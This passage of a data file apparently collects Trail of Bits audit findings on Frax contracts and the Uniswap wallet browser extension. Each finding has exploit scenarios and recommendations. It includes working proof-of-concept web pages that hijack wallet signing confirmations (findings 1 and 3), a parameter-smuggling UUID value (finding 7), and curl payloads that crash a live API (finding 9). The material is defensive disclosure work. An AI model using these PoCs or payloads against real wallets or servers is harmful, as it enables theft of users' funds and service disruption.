Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization. 18. calc_withdraw_one_coin is vulnerable to manipulation Severity: High Diculty: High Type: Data Validation Finding ID: TOB-FRSOL-018 Target: MIM_Convex_AMO.sol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "25. Setting collateral values manually is error-prone ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "During the audit, the Frax Solidity team indicated that collateral located on non-mainnet chains is included in FRAX.globalCollateralValue in FRAXStablecoin , the Ethereum mainnet contract . (As indicated in TOB-FRSOL-023 , this collateral cannot currently be redeemed by users.) Using a script, the team aggregates collateral prices from across multiple chains and contracts and then posts that data to ManualTokenTrackerAMO by calling setDollarBalances . Since we did not have the opportunity to review the script and these contracts were out of scope, we cannot speak to the security of this area of the system. Other issues with collateral accounting and pricing indicate that this process needs review. Furthermore, considering the following issues, this privileged role and architecture signicantly increases the attack surface of the protocol and the likelihood of a hazard:     The correctness of the script used to calculate the data has not been reviewed, and users cannot audit or verify this data for themselves. The conguration of the Frax Protocol is highly complex, and we are not aware of how these interactions are tracked. It is possible that collateral can be mistakenly counted more than once or not at all. The reliability of the script and the frequency with which it is run is unknown. In times of market volatility, it is not clear whether the script will function as anticipated and be able to post updates to the mainnet. This role is not explained in the documentation or contracts, and it is not clear what guarantees users have regarding the collateralization of FRAX (i.e., what is included and updated). As of December 20, 2021, collatDollarBalance has not been updated since November 13, 2021 , and is equivalent to fraxDollarBalanceStored . This indicates that FRAX.globalCollateralValue is both out of date and incorrectly counts FRAX as collateral (see TOB-FRSOL-024 ). Recommendations Short term, include only collateral that can be valued natively on the Ethereum mainnet and do not include collateral that cannot be redeemed in FRAX.globalCollateralValue . Long term, document and follow rigorous processes that limit risk and provide condence to users. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "1. Sidebar approval screen may be suddenly switched ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension sidebar (Chrome sidePanel component) is global (i.e., shared between all tabs in a browser window). The sidebar displays layers with conrmation buttons for users' actions, where the actions are triggered via requests to the JavaScript Ethereum API. The layers are stacked on top of each othera layer for the newest request is put on top of old layers. Because of these facts, a malicious website running in one tab can unexpectedly overlay a conrmation button (originating from an honest website) in another tab. pending: [], // ordered array with the most recent request at the end Figure 1.1: Ordered array for the layers (universe/apps/stretch/src/background/features/dappRequests/slice.ts#8) // Show only the last request const pendingRequests = useAppSelector((state) => state.dappRequests.pending) const request = pendingRequests[pendingRequests.length - 1] Figure 1.2: The DappRequestContent function displays the most recent request. (universe/apps/stretch/src/background/features/dappRequests/DappRequestCo ntent.tsx#5658) The vulnerability is hard to exploit because its timing must be precisely measured or guessed. On the other hand, the vulnerability also increases the chances of a more standard phishing attack because it allows malicious websites to open the wallet when the user is navigating on a completely dierent webpage. Exploit Scenario Alice has opened two dapp websites, one malicious and one honest, in two tabs. She connects both dapps to the Uniswap wallet browser extension. Alice goes to the honest dapp and creates a blockchain transaction. The honest dapp uses the Ethereum API to display the sidebar. The sidebar displays transaction details and asks for conrmation. Alice reviews the details and clicks the conrmation button. However, just before Alice clicks the button, the malicious website makes a request to the Ethereum API. The request causes a new layer to be displayed in the sidebara layer with a button conrming a new, malicious transaction. Alice unwillingly signs the transaction from the malicious dapp. A malicious website could host code similar to that in gure 1.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap exptension - TOB-UNIEXT-1</title> </head> <body> <script type=\"text/javascript\"> let provider = null; async function poc() { try { console.log('Start TOB-UNIEXT-1 PoC'); console.log(provider); await new Promise(r => setTimeout(r, 4000)); // wait let addr = await provider.enable(); console.log(addr); } catch (err) { console.error(err); } } document.addEventListener(\"visibilitychange\", (event) => { if (document.visibilityState != \"visible\") { console.log(\"User changed tab\"); (async () => { try { await poc(); } catch(err) { console.error(err); } })() } }); const initialize = async () => { window.addEventListener('eip6963:announceProvider', (event) => { provider = event.detail.provider; }); window.dispatchEvent(new Event('eip6963:requestProvider')); }; window.addEventListener('load', initialize); </script> </body> </html> Figure 1.3: An example malicious website that switches the sidebar conrmation button 4 seconds after the button is clicked Recommendations Short term, have the sidebar push new requests (layers) to the bottom of the stack instead of showing them on top of previous requests. Allow users to switch between old and new requests. Also, add the number of requests to be acknowledged (i.e., the number of layers) in the UIfor example, 1 of 9 requests waiting to be acknowledged. Make the sidebar enable the conrmation button a few seconds after it is opened so that users will not accidentally click it. Make the sidePanel tab-specic instead of global by removing the default_path eld from the manifest.json le and explicitly setting the path option before opening the sidePanel. A tab-specic sidePanel means a new instance of the panel is created for the tab. Not sharing the state between tabs will help avoid race conditions, data exposure, and user interfacerelated vulnerabilities on the architecture level. Either of the two proposed changes requires a signicant redesign of the React application architecture and will impact the functionality (i.e., the sidePanel will not be kept open when a user changes tabs). Consider making the injected Ethereum API (content script) respond only to actions triggered by a users gesturethat is, accept requests to the API only if they originate from a direct user action like a button click. This can be done in a variety of ways:  In the content script  Checking the navigator.userActivation.isActive ag  Listening to the visibilitychange event  In the background component  Always opening the sidePanel before processing the requests from the content script and doing so outside of a try-catch block (a sidePanel can be opened programmatically only on user interaction)  Consulting the isTrusted property of an event This recommendation will make exploitation of various vulnerabilities harder. However, it may limit the functionality of dapps that need to interact with a wallet without user interaction. The EIP-6963 and EIP-1193 standards do not specify that the Ethereum API should be triggered only on user interaction. On the other hand, MetaMask advises dapp developers to initiate a connection to a wallet only on user interaction. A compromise between usability and security may be to limit only some Ethereum APIs (e.g., the enable method and the eth_requestAccounts request). Long term, design the UI so that dialog boxes do not unexpectedly show up, elements do not move around without user interaction, and windows do not gain focus in unexpected moments. Sudden interface changes could lead users to perform actions other than those intended. This issue impacts the user experience and may have security consequences. References  Missile Warning System meme (based on the 2018 Hawaii false missile alert)", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. No password policy enforcement when changing the wallets password ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension correctly enforces a password policy when initializing a wallet. However, the password change functionality does not enforce any password policy (gure 2.1). Figure 2.1: Change password functionality with a password set to 1. Exploit Scenario A user changes his wallets password to 123. He uses this low-complexity password to authenticate to his wallet repeatedly. An attacker standing next to his computer sees the password provided by the user. The user leaves his laptop for a minute, and the attacker quickly steals funds. Recommendations Short term, enforce the same password policy in the change password functionality.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Race condition with tab IDs in the background component ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The background component asynchronously processes requests from the injected JavaScript Ethereum API (the extensions content script). The background receives a windows tab ID along with the request, then pulls dapp information (e.g., the URL) using the previously provided tab ID. A malicious dapp can send a request and immediately change its tabs information (e.g., by changing the URL location). This means there is a time-of-check time-of-use (TOCTOU) vulnerability in the background component. The background component handles requests from the Ethereum API in the initMessageBridge method, which stores the request together with the tab ID (gure 3.1) as an addRequest action. if (requiresApproval(request)) { await openSidebar(sender.tab?.id, sender.tab?.windowId || 0) } // Dispatches a saga action which will handle side effects as well store?.dispatch( addRequest({ dappRequest: request, senderTabId: sender.tab?.id || 0, }) ) Figure 3.1: Storing request and tab ID in the background component (universe/apps/stretch/src/background/index.ts#228238) The addRequest actions are processed by the dappRequestWatcher method (gure 3.2), which calls the handleRequest function (gure 3.3). export function* dappRequestWatcher() { while (true) { const { payload, type } = yield* take(addRequest) if (type === addRequest.type) { yield* call(handleRequest, payload) } } } Figure 3.2: Code processing the previously stored requests (universe/apps/stretch/ src/background/features/dappRequests/saga.ts#8088) The handleRequest function calls the Chrome API to get the tabs URL, given the tabs ID, and the URL is used to nd information about a dapp. const tab = yield* call(chrome.tabs.get, requestParams.senderTabId) const dappUrl = extractBaseUrl(tab.url) const dappInfo = yield* select(selectDappInfo(dappUrl)) const isConnectedToDapp = dappInfo && dappInfo.connectedAccounts?.length > 0 Figure 3.3: The rst TOCTOU entry point in the handleRequest function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#111115) The dapp information is then used for basic authentication and saved with the request in the extensions global statein the pending array (gure 3.4). add: (state, action: PayloadAction<DappRequestStoreItem>) => { // According to EIP-1193 when switching the active chain, cancel all pending RPC requests and chain-specific user confirmations. if (action.payload.dappRequest.type === DappRequestType.ChangeChain) { state.pending = [action.payload] } else { state.pending.push(action.payload) } }, Figure 3.4: The method saving requests in the extensions global state (universe/apps/ stretch/src/background/features/dappRequests/slice.ts#2128) The DappRequestContent function pulls data from the pending array (gure 3.5) and calls the Chrome API again to display the dapp information in the sidePanel (gure 3.6). const pendingRequests = useAppSelector((state) => state.dappRequests.pending) const request = pendingRequests[pendingRequests.length - 1] Figure 3.5: Pulling from the extensions global state (universe/apps/stretch/src/ background/features/dappRequests/DappRequestContent.tsx#5758) useEffect(() => { chrome.tabs.get(request.senderTabId, (tab) => { const newUrl = extractBaseUrl(tab.url) || '' setDappUrl(newUrl) setDappName(newUrl.endsWith('.uniswap.org') ? 'Uniswap' : tab.title || '') setDappIconUrl(tab.favIconUrl || '') }) }, [request.senderTabId]) Figure 3.6: The second TOCTOU entry point in the DappRequestContent function (universe/apps/stretch/src/background/features/dappRequests/DappRequestCo ntent.tsx#6875) In addition to the two TOCTOU entry points, there are a few more entry points that may be exploited similarly:  The entry point in the changeChain function (gure 3.7) can be used to change the chain ID assigned to a dapp. export function* changeChain({ dappRequest, senderTabId }: DappRequestStoreItem) { const updatedChainId = (dappRequest as ChangeChainRequest).chainId const provider = yield* call(getProvider, updatedChainId) const tab = yield* call(chrome.tabs.get, senderTabId) Figure 3.7: The TOCTOU entry point in the changeChain function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#304307)  The attack vector for the entry point in the getAccountRequest function (gure 3.8) is undetermined. export function* getAccountRequest({ dappRequest, senderTabId }: DappRequestNoDappInfo) { const activeAccount = yield* appSelect(selectActiveAccount) const tab = yield* call(chrome.tabs.get, senderTabId) const dappUrl = extractBaseUrl(tab.url) Figure 3.8: The TOCTOU entry point in the getAccountRequest function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#216219)  The entry point in the sendMessageToSpecificTab function (gure 3.9) may be used to disclose data from a dapp if the dapp redirects to a malicious website or if the user manually navigates to the malicious website. chrome.tabs.sendMessage<Message>(tabId, message).catch((error) => { onError?.() logger.error(error, { tags: { file: 'messageUtils', function: 'sendMessageToSpecificTab' } }) }) Figure 3.9: The TOCTOU entry point in the sendMessageToSpecificTab function (universe/apps/stretch/src/background/utils/messageUtils.ts#4649)  The entry point in the sendMessageToActiveTab function (gure 3.10) is dierent in that the function acts on a currently active tab. To trigger the bug, it would be necessary to make an Ethereum API request (e.g., connect the wallet to a dapp) in one tab and then switch focus to another tabthe response to the request should go to the website in the second tab. export function sendMessageToActiveTab(message: Message, onError?: () => void): void { chrome.tabs.query({ active: true, currentWindow: true }, ([tab]) => { if (tab?.id) { chrome.tabs.sendMessage<Message>(tab.id, message).catch(() => { onError?.() // If no listener is listening to the message, the promise will be rejected, // so we need to catch it unless there is an explicit error handler }) } }) } Figure 3.10: The TOCTOU entry point in the sendMessageToActiveTab function (universe/apps/stretch/src/background/utils/messageUtils.ts#919) Exploit Scenario Alice connects her Uniswap wallet browser extension to a malicious website. The website triggers a request for a transaction signature via the Ethereum API and immediately redirects itself to the Uniswap website. The Uniswap extensions sidePanel displays the signature request and a conrmation button with the Uniswap information (gure 3.11). The Uniswap website did not have to be previously connected to the extension. Figure 3.11: The Uniswap information in the sidePanel Alice wrongly believes that the signature request comes from Uniswap and accepts it. She loses tokens. The malicious website could use a script similar to the one shown in gure 3.12. <!DOCTYPE html><html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap exptension - TOB-UNIEXT-3</title> </head><body> <script type=\"text/javascript\"> const wait_time = 120; // ADJUST THAT const address = '0xCAFE21005d9D29F0C27460A8324de852b91b79b1'; // whatever const target = 'https://app.uniswap.org/swap?chain=mainnet'; let provider = null; async function poc() { try { console.log('Start TOB-UNIEXT-3 PoC'); await new Promise(r => setTimeout(r, 2000)); // for demo purposes only // move to other website window.location = target; // sleep, because location change is slow await new Promise(r => setTimeout(r, wait_time)); // to bypass content script's isAuthorized provider.publicKeys = [address]; // trigger asynchronous request ethereum.request({ method: 'personal_sign', params: ['0x414142', address], }); } catch (err) { console.error(err); } } const initialize = () => { window.addEventListener('eip6963:announceProvider', (event) => { console.log(event.detail.provider); provider = event.detail.provider; (async () => { try { await poc(); } catch(err) { console.error(err); } })() }); window.dispatchEvent(new Event('eip6963:requestProvider')); }; window.addEventListener('load', initialize); </script> </body> </html> Figure 3.12: Proof-of-concept exploit To debug the vulnerability, it is easiest to set a breakpoint in the extensions service worker (the background component). Recommendations Short term, use the URL as the only authentication data and stop using tab IDs for control ow purposes. The root cause of the vulnerability described in this nding is confusion between the two identiers: the URL and the tab ID. The fact that the sidePanel is global and not tab-specic further adds to the confusion. To start xing the issue, replace the sender.tab.id argument in the call to the addRequest method in the initMessageBridge function (gure 3.1) with sender.url or sender.originresearch which one of these two should be used. With this change, the background component will be able to uniquely determine the dapp (website) sending the request and will not have to request data from the Chrome API using tab IDs. The previous recommendation eliminates race conditions in the content script for background communication. However, communication in the other direction may also suer from race conditionsthat is, the background may asynchronously send a message to the wrong content script. To mitigate that, we recommend having the code either check the tab's URL just before sending a message (e.g., using the sendMessageToUrl method) or implementing long-lived communication channels.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "4. The clipboard is not cleared when copying the recovery phrase ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "When the recovery phrase is copied, the Uniswap wallet browser extension does not remove it from the clipboard after a specied thresholdfor example, one minuteas shown in gure 4.1. Clearing the clipboard is important because its contents can be accessed outside the browsers context (i.e., by other applications on the users OS). Figure 4.1: The recovery phrase view in the Uniswap wallet browser extension with the copy functionality Exploit Scenario A user copies his recovery phrase and then opens a malicious application that steals the recovery phrase from the OS clipboard, which leads to stolen funds. Recommendations Short term, modify the code to clear the clipboard from the extensions context after one or two minutes when the recovery phrase is copied.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Browser extension crashes when data to be signed does not follow EIP-712 standard ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension crashes when a data message for the user to sign in using the eth_signTypedData_v4 method does not follow the EIP-712 format. First, the browser extension crashes (gure 5.1) when the message does not contain the required TypedData parameter (gure 5.2). Figure 5.1: The Uniswap browser extension crashes when a message to be signed does not contain the required TypedData. await window.ethereum.request( { \"method\": \"eth_signTypedData_v4\", \"params\": [ \"0x0000000000000000000000000000000000000000\", ]}); Figure 5.2: An example request using the eth_signTypedData_v4 method with the message without the required TypedData The extension crashes because the SignTypedDataDetails function does not check whether the rawTypedData parameter is valid and passes the rawTypedData directly to the JSON.parse function (gure 5.3, lines 1314). 6 7 8 9 10 11 12 13 export const SignTypedDataDetails = ({ chainId, request, }: { chainId: number request: DappRequestStoreItem }): JSX.Element => { const rawTypedData = (request.dappRequest as SignTypedDataRequest).typedData 14 (...) const typedData: EthTypedMessage = JSON.parse(rawTypedData) Figure 5.3: The SignTypedDataDetails function responsible for parsing typed data (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SignTypedDataContent.tsx#614) Second, the extension crashes (gure 5.6) when the message does not contain the message property (gure 5.4). The SignTypedDataDetails method passes the typedData.message property without any check to the getParsedObjectDisplay method (gure 5.5). The typedData.message becomes undened if it does not exist in the message. Then an undened typedData.message is passed to the Object.keys function in the getParsedObjectDisplay function to create an array containing all the keys of the obj object. Creating an array with the undened obj leads to a crash. await window.ethereum.request({ \"method\": \"eth_signTypedData_v4\", \"params\": [ \"0x0000000000000000000000000000000000000000\", JSON.stringify({ IamNotMessage: { content: 'Hello, world!' },})]}); Figure 5.4: An example request using the eth_signTypedData_v4 method with the message without the required message property {getParsedObjectDisplay(chainId, typedData.message)} // (...) const getParsedObjectDisplay = (chainId: number, obj: any,depth = 0): JSX.Element => { // (...) {Object.keys(obj).map((objKey) => { Figure 5.5: Part of the SignTypedDataDetails function that directly passes the typedData.message to the getParsedObjectDisplay function (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SignTypedDataContent.tsx#1939) Figure 5.6: The Uniswap wallet browser extension crashes when a message to be signed does not contain the required message property. Exploit Scenario An attacker nds a way to force a user to sign a malformed message that crashes the users extension. The crash disrupts condence in the Uniswap browser extensions security. Recommendations Short term, add appropriate checks for the rawTypedData and typedData.message variables to ensure they are not null or undened. Long term, extend unit tests to cover a scenario with a malformed message to be signed. Additionally, cover the SignTypedDataDetails and getParsedObjectDisplay functions with fuzz tests.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "6. Minimum Chrome version not enforced ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The manifest.json le of the Uniswap wallet browser extension does not contain a eld to enforce a minimum Chrome version. Having this eld can prevent a user from using a potentially vulnerable version because it will force the user to update before using the extension. Furthermore, service worker lifetime behaviors dier depending on the Chrome version, which could result in dierentials. Exploit Scenario A user opens the Uniswap wallet browser extension while using a vulnerable version of Chrome, which is exploited by an attacker. Recommendations Short term, choose a minimum Chrome version to support based on the desired service worker lifetime behaviors. Specify this version in the manifest.json le.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Data from Uniswap server is weakly validated in Scantastic protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "Data received by the Uniswap wallet browser extension from the remote Uniswap server is not validated, which allows the server to provide malicious data, forcing the extension to perform actions impacting the users security. The UUID information used to construct QR codes is especially sensitive. The UUID is received from the server and saved in local storage without any validation (gure 7.1). Later it is used to construct a QR code without URL encoding (gure 7.2) and URL addresses for HTTP requests (gure 7.3). // Initiate scantastic onboarding session const response = await fetch(`${uniswapUrls.apiBaseExtensionUrl}/scantastic/uuid`, { method: 'POST', headers: { Accept: 'application/json', }, }) // TODO(EXT-485): improve error handling if (!response.ok) { logger.error('failed to fetch uuid for mobile->ext onboarding', { {...omitted for brevity...} }) return } const data = await response.json() // TODO(EXT-485): improve error handling if (!data.uuid) { return } {...omitted for brevity...} setSessionUUID(data.uuid) sessionStorage.setItem(ONBOARDING_UUID, data.uuid) Figure 7.1: The extension receives the UUID from the server. (universe/apps/stretch/src /app/features/onboarding/scan/ScantasticContextProvider.tsx#99129) let qrURI = `scantastic://pubKey=${JSON.stringify(publicKey)}&uuid=${sessionUUID}` Figure 7.2: The extension uses the UUID to construct a QR code without encoding. (universe/apps/stretch/src/app/features/onboarding/scan/utils.ts#58) // poll OTP state const response = await fetch( `${uniswapUrls.apiBaseExtensionUrl}/scantastic/otp-state/${sessionUUID}`, { method: 'POST', headers: { Accept: 'application/json', }, } ) Figure 7.3: The extension uses the UUID to construct a URL without encoding. (universe/apps/stretch/src/app/features/onboarding/scan/ScantasticContext Provider.tsx#155164) The vulnerability has been set to only low severity because the Uniswap mobile application uses the rst pubKey parameter from the QR code, which happens to be the correct one. However, the system is secure accidentally and the vulnerability would be of high severity otherwise. export function parseScantasticParams(uri: string): ScantasticModalState { const pubKey = new URLSearchParams(uri).get('pubKey') || '' const uuid = new URLSearchParams(uri).get('uuid') || '' const vendor = new URLSearchParams(uri).get('vendor') || '' const model = new URLSearchParams(uri).get('model') || '' const browser = new URLSearchParams(uri).get('browser') || '' return { pubKey, uuid, vendor, model, browser } } Figure 7.4: The mobile application uses the rst parameter with the given key. (universe/apps/ mobile/src/components/WalletConnect/ScanSheet/util.ts#167174) Exploit Scenario Mallory takes control of the Uniswap server and modies its code. The server starts sending malicious UUIDs in response to requests to the /v2/scantastic/uuid URL. The modied responses look like the following: \"uuid\":\"a-b-c-d&pubKey={}&vendor=X\" Alice onboards her wallet from the mobile application to Uniswaps extension. She scans a QR code that contains a Scantastic URL with two pubKey and two vendor parameters. scantastic://pubKey={\"alg\":\"RSA-OAEP-256\",\"e\":\"AQAB\",\"ext\":true,\" key_ops\":[\"encrypt\"],\"kty\":\"RSA\",\"n\":\"wZVbc\"}&uuid=a-b-c-d&pubKe y={}&vendor=X&vendor=Apple&model=Macintosh&browser=Chrome The mobile application uses the rst pubKey (generated by the extension). However, the mobile application also uses the rst vendor (injected by the server). Alice manually validates the vendor, trusting it to come from the extension. She is tricked by the server. Recommendations Short term, make the extension strictly validate all data received from remote servers. At a minimum, the code shown in gure 7.1 should be xed. Make the extension encode data before using it to construct QR codes and URLs. At a minimum, the code shown in gures 7.2 and 7.3 should be xed. Ensure that data from QR codes is validated in the mobile application. If there are URLs from Scantastic QR codes, the application should verify the following:  The URL contains only a single schema separator [://].  The URL schema is equal to the scantastic string.  All keys in the URLs search parameters are unique.  The UUID from the URL has the expected syntax.  The pubKey from the URL has the expected syntax and its elds (e.g., alg and kty) have expected values.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "8. Wallet information accessible in locked state ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "It is possible to interact with the locked Uniswap wallet browser extension. For example, when connected to a dapp, the locked extension still allows a website to return a user's address (gure 8.1). However, during the audit, we did not nd that it was possible to send a transaction on the locked or disconnected wallet. Figure 8.1: An example interaction with the locked Uniswap wallet Exploit Scenario Bob connects the wallet with a dapp and locks the wallet. He can then see that some data is still available on the dapp, even though he locked the wallet. He compares this behavior to competitors wallets and loses condence in the Uniswap wallet browser extension. Recommendations Short term, ensure that no interaction to retrieve sensitive data (e.g., using an address to retrieve the account balance) is possible on the locked wallet. Long term, extend the testing suite to ensure the browser extension prevents any interaction in the locked state.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "9. Scantastic server API does not strictly validate users data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The data coming from the user is not validated on the Scantastic level. The resulting error sources rely on the back-end components (such as DynamoDB). This behavior can lead to unpredictable server-side problems, especially if the specics of the back-end components change in the future. For example, creating a blob longer than 409,495 characters is impossible because the blob exceeds the maximum item size supported by DynamoDB (gure 9.1). $ random_num=$(printf 'A%.0s' {1..409496}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/blob' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"d2d5cebe-d5e1-4bdf-8a4c-275341172242\",\"blob\":\"$random_num\"} EOF {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.1: Commands that send a 409,496-character-long blob to the Scantastic API It is feasible to obtain an OTP for a 409,495-character-long blob (gure 9.2), but it is impossible to retrieve the blob via the /v2/scantastic/otp API call because the server returns a 500 Internal Server Error (gure 9.3). $ random_num=$(printf 'A%.0s' {1..409495}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/blob' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"ea284e33-239e-403f-a6b2-0a93ca843942\",\"blob\":\"$random_num\"} EOF {\"otp\":\"933648\",\"expiresAtInSeconds\":1707735704} Figure 9.2: Commands that send a 409,495-character-long blob to the Scantastic API $ random_num=$(printf 'A%.0s' {1..409495}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/otp' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"ea284e33-239e-403f-a6b2-0a93ca843942\",\"otp\":\"933648\"} EOF {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.3: Commands that try to retrieve the 409,495-character-long blob Additionally, the Scantastic API does not implement the UUID validation. The resulting internal server error (gure 9.4) occurs because DynamoDB does not consider the empty string a valid value for a primary key attribute. POST /v2/scantastic/blob HTTP/2 Host: gateway.uniswap.org Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe Content-Length: 24 {\"uuid\":\"\",\"blob\":\"abc\"} HTTP/2 500 Internal Server Error Date: Mon, 12 Feb 2024 11:08:13 GMT Content-Type: application/json Content-Length: 52 (...) {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.4: An HTTP request-and-response cycle that sends a blob with an empty UUID Recommendations Short term, implement strict validation of user-supplied data in the Scantastic API. Long term, periodically scan the Scantastic API dynamically to identify any edge-case scenarios unhandled by the application.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Extensions content script is injected into les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension species the content_scripts.matches eld as the <all_urls> pattern. Therefore, the injected.js le is injected into both HTTP websites and local les opened with a browser. This behavior unnecessarily increases the attack surface. Moreover, opening the wallet in a local HTML le makes the wallet display only the file:// schema and not the lename or le path. If the content_scripts.matches eld is to be kept as it is, then this issue must be xed. Figure 10.1: Uniswap wallet browser extension does not display lename. Exploit Scenario Alice downloads a malicious HTTP le and opens it in a browser. The le exploits vulnerabilities in the Uniswap browser extension using the injected content script. Recommendations Short term, set the content_scripts.matches eld to https://*/. This will limit content script injections to websites only.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Messages with non-printable characters are displayed incorrectly in personal_sign request ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension opens a pop-up dialog box when a dapp requests a signature using the JavaScript Ethereum API. The dialog box displays a message to be signed to a user. The message is shown as UTF-8 text. If the message contains non-printable or binary characters, the characters are displayed as whitespaces (gure 11.1). Figure 11.1: Message 0x410a0d0b0c20420043 as presented to the user const request: SignMessageRequest = { type: DappRequestType.SignMessage, requestId: uuidv4(), messageHex: ethers.utils.toUtf8String(messageHex), } Figure 11.2: Message converted from hex to UTF-8 in the handleEthSignMessage method (universe/apps/stretch/src/contentScript/InjectedProvider.ts#348352) Exploit Scenario A malicious dapp requests a user to sign a specially crafted message that contains a combination of UTF-8 and non-printable characters. It is displayed by the browser extension in a way that masks the true content of the message. The user signs a dierent message than they see on the screen. Recommendations Short term, have the code detect non-printable characters and display messages containing such characters with hex encoding. Alternatively, reject such messages. Consider always displaying a message in two ways: as plaintext and in hex encoding. Additionally, consider warning users about messages containing non-printable characters, as these may be misleading during manual, human verication. Unfortunately, the personal_sign method is underspecied and various wallets handle messages in dierent ways.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "12. Ethereum API signing methods do not validate all arguments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension does not validate some arguments when handling the personal_sign and eth_signTypedData_v4 methods of the Ethereum API. The personal_sign method (implemented in the handleEthSignMessage function) and the eth_signTypedData_v4 method (implemented in the handleEthSignTypedData function) take two arguments: the message to sign and the signers address. The Uniswap extension ignores the address argument. This issue may cause dapps to behave incorrectly. The eth_signTypedData_v4 method species a chain ID that should be validated against the chain ID active in the wallet, but it is not. Exploit Scenario Alice connects a dapp to her Uniswap wallet browser extension with address X. The dapp requests a signature with the personal_sign or eth_signTypedData_v4 method for address Y. Alice signs with a dierent address than the dapp requested. The dapp is confused. Recommendations Short term, make the handleEthSignMessage function check the address argument. If the address is dierent from the connected wallet address, the function should either reject the request as unauthorized or ask the user to change wallets. The address should be checked in the background component, not in the content script.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "13. Not all data is displayed to users for manual validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension does not display all relevant data for manual verication by the user. At least the eth_signTypedData_v4 method is vulnerable. A Permit operation on the eth_signTypedData_v4 method causes the extension to display the owner and spender parameter information but not display the value, nonce, and deadline parameters. Figure 13.1: Uniswap wallet browser extension (rst image) displays less data than the Rabby wallet (second image) and the MetaMask wallet (third image) Exploit Scenario Alice connects her Uniswap wallet browser extension to a malicious dapp. The dapp uses the eth_signTypedData_v4 method to ask Alice for a signature to call a smart contracts permit function. The dapp tells Alice that the permitted value is small (e.g., 1 token). However, the dapp calls the eth_signTypedData_v4 method with a large value100,000 tokens. The wallet does not display the value information to Alice, and she incorrectly thinks that it is equal to the 1 token. She signs the message. The dapp drains Alices account. Recommendations Short term, make the browser extension display all relevant information to the user when handling the eth_signTypedData_v4 method. Review other methods and operations and ensure that they make the wallet display all 